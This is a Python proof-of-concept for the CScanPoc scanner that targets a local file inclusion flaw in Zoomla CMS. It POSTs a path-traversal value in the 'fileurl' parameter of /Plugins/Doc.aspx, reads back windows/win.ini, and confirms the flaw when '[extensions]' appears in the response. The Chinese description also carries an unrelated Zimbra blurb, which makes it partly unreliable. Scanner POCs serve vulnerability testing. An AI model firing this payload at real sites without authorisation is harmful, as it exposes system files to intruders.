# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zoomla_0102'  # 平台漏洞编号
    name = '逐浪cms文件包含漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-04-09'  # 漏洞公布时间
    desc = '''
        Zimbra提供一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。它最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。
        Zoomla!逐浪®CMS是运行在微软大数据平台上的一款卓越网站内容管理系统，基于.NET4.5框架，SQL Server数据库平台（扩展支持Oracle甲骨文、MYSQL诸多数据库）、纯净的MVC架构，系统在优秀的内容管理之上，提供OA办公、移动应用、微站、微信、微博等能力，完善的商城、网店等管理功能，并包括教育模块、智能组卷、在线试戴、在线考试及诸多应用。Zoomla!逐浪®CMS不仅是一款网站内容管理系统，更是企业信息化的起点，也是强大的WEB开发平台，完全免费开放，丰富的学习资源和快速上手教程，并结合自主的字库、Webfont解决方案、逐浪云，为中国政府、军工、世界五百强企业以及诸多站长、开发者提供卓越的软件支持。
        逐浪cms文件包含漏洞漏洞，攻击者可以通过本地文件包含读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=48639'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zoomla'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7e48c477-1576-4201-bf2d-6dd142835e9d'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "btnBill=%e7%94%9f%e6%88%90%e5%90%88%e5%90%8c%e5%88%b0%e4%ba%91%e7%9b%98&Button1=%e6%a0%bc%e5%bc%8f%e9%a2%84%e8%a7%88&fileurl=../../../../../../../../../../windows/win.ini&Mydoc=%e6%88%91%e7%9a%84%e5%90%88%e5%90%8c&selCard=&txtDes=&__VIEWSTATE=/wEPDwUKLTMxMTEyOTYzMQ9kFgICAw9kFgJmDxYCHgtfIUl0ZW1Db3VudAIIFhBmD2QWAmYPFQIBMQzlhazlj7jlkIjlkIxkAgEPZBYCZg8VAgEyDOazleW%2bi%2baWh%2bWHvWQCAg9kFgJmDxUCATMQ6LSt6ZSA5ZCI5ZCMLmRvY2QCAw9kFgJmDxUCATQT5Yqz5Yqo5ZCI5ZCM5LmmLmRvY2QCBA9kFgJmDxUCATUZ6K%2bV55So5ZGY5bel6ICD5qC46KGoLmRvY2QCBQ9kFgJmDxUCATYZ5Zui5L2T5Z%2b56K6t55Sz6K%2b36KGoLmRvY2QCBg9kFgJmDxUCATcW57un5om/5p2D6K%2bB5piO5LmmLmRvY2QCBw9kFgJmDxUCATgc6K%2bJ6K686LSi5Lqn5L%2bd5YWo55Sz6K%2b3LmRvY2RkaEU/PNdxxazElafJNZNrFjYXg8spHysdi8MtZ8%2b7cTQ%3d"
            url = self.target + "/Plugins/Doc.aspx"
            response = requests.post(url, data=payload)
            if response.status_code == 200 and "[extensions]" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
